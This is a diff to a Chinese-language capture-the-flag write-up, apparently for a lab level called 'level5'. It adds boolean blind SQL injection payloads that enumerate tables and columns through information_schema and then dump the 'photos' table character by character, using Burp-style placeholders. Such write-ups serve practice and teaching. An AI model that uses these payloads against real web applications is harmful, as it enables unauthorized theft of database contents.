@@ -59,14 +59,25 @@ select ascii(substring((select user()),[0-9],1))=[ascii码];
 
 ## 得出当前表名，其 url 构造如下
 ```
-%20and%20(select%20ascii(substring((select table_name from information_schema.tables where table_name="albums" limit 0,1),$_$,1)))=$_$ --
+/91aa2fb1f2/fetch?id=2 and (select substring((select group_concat(table_name) from information_schema.tables where table_schema="level5"),1,1))="a" --
 ```
 
-得出第一张的表名：albums
+得出表名：albums,photos
 
 # 构造字段名
 
 ```
-%20and%20(select%20ascii(substring((select column_name from information_schema.columns where table_schema="level5" limit 0,1),$_$,1)))=$_$ --
+/91aa2fb1f2/fetch?id=2 and (select substring((select group_concat(column_name) from information_schema.columns where table_name="albums"),2,1))="d" -- 
 ```
+从 albums 得到 id, title
+从 photos 得到 id, title,filename,parent
 
+# dump 数据
+首先查看要 dump 的数据有多大，使用 lenth
+```sql
+and (select length((select group_concat(id,title,parent) from photos)))=§d§ -- 
+```
+然后开始dump 数据
+```
+/91aa2fb1f2/fetch?id=2 and (select substring((select group_concat(title,filename,parent) from photos),§2§,1))="§d§" --
+```
